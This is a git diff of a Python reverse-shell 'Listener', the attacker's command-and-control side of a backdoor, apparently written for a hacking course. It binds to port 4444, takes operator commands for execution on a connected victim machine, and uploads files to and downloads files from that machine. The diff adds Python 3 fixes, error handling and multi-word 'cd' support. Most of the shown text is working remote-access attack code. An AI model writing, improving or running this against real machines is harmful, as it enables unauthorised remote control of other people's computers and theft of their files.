@@ -15,9 +15,10 @@ class Listener:
 	def reliable_send(self, data): # Encodes the sending message into JSON for serialization
 		json_data = json.dumps(data) # encodes
 		self.connection.send(json_data.encode()) # sends via encoded message through socket
+		# encode() for byte-type encode for p3 compatibility
 	
 	def reliable_recv(self): # Decodes the receiving message from JSON to plain text
-		json_data = b""
+		json_data = b"" # byte type object -string- (P3 comp)
 		while True:
 			try: # if the data is higher that buffer size, iterates
 				json_data = json_data + self.connection.recv(1024) # recieves encoded message
@@ -48,17 +49,22 @@ class Listener:
 			command = input(">> ") # user prompt
 			command = command.split(" ") # split input based on spaces
 			
-			if command[0] == 'upload': # upload a file to client PC
-				file_content = self.read_file(command[1]) # second element of list is filename
-				command.append(file_content) # third element of list is the content
+			try:
+				if command[0] == 'upload': # upload a file to client PC
+					file_content = self.read_file(command[1]) # second element of list is filename
+					command.append(file_content.decode()) # third element of list is the content
+				elif command[0] == "cd" and len(command) > 2:
+					command[1] = " ".join(command[1:])
+				result = self.execute_remotely(command)
 				
-			result = self.execute_remotely(command)
+				if command[0] == 'download' and "[-] Error " not in result: # download command
+					result = self.write_file(command[1], result)
 			
-			if command[0] == 'download': # download command
-				result = self.write_file(command[1], result)
-			
+			except Exception:
+				result = "[-] Error during command execution."
+				
 			print(result)
 
-my_listener = Listener("192.168.0.10", 4444) # ip for binding the listener to local machine
+my_listener = Listener("192.168.0.199", 4444) # ip for binding the listener to local machine
 print("[+] Type 'stop' to stop connection and quit programs.")
 my_listener.run()
